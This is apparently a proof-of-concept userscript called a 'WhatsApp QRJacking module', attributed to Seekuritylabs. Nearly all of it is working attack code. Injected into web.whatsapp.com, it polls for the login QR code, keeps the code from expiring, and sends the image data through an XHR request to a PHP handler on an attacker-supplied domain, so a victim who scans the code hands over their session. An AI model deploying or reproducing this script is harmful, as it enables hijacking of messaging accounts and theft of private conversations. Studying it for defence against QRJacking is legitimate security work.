// ==UserScript==
// @name        WhatsApp QRJacking module
// @namespace   Seekuritylabs (@Seekurity)
// The code will be injected in web.whatsapp.com web page and periodically searching for the element which holds the 
// QR Code image then will perform an XHR request to send this QR image code "base64" code to our server side php script
// which is responsible for converting and storing this "base64 code" to an image file. Also the code is responsible to 
// wake WhatsApp’s QR Code if it is inactive and needs the attacker's interaction to reload it.
// ==/UserScript==

var myTimer;
myTimer = window.setInterval(loopForQR, 3000);
function loopForQR() {
  if (document.readyState == 'complete') {
    $service = window.location.href;
    if ($service.indexOf('web.whatsapp.com') >= 0)
    {
      //Always wake-up the qrcode, Never sleep :D
      if (document.getElementsByClassName('qr-button')[0] !== undefined)
      {
        document.getElementsByClassName('qr-button')[0].click();
      }
      //If WhatsApp is not logged in, Do;
      if (document.getElementsByClassName('icon icon-chat')[0] == null)
      {
        //Mirror the QR Code to our server
        var xhttp = new XMLHttpRequest();
        xhttp.open('GET', 'https://www.Your_Domain.com/qrHanlder.php?c=' + document.getElementsByTagName('img')[0].src, true);
        xhttp.send();
      }
    }
  }
}
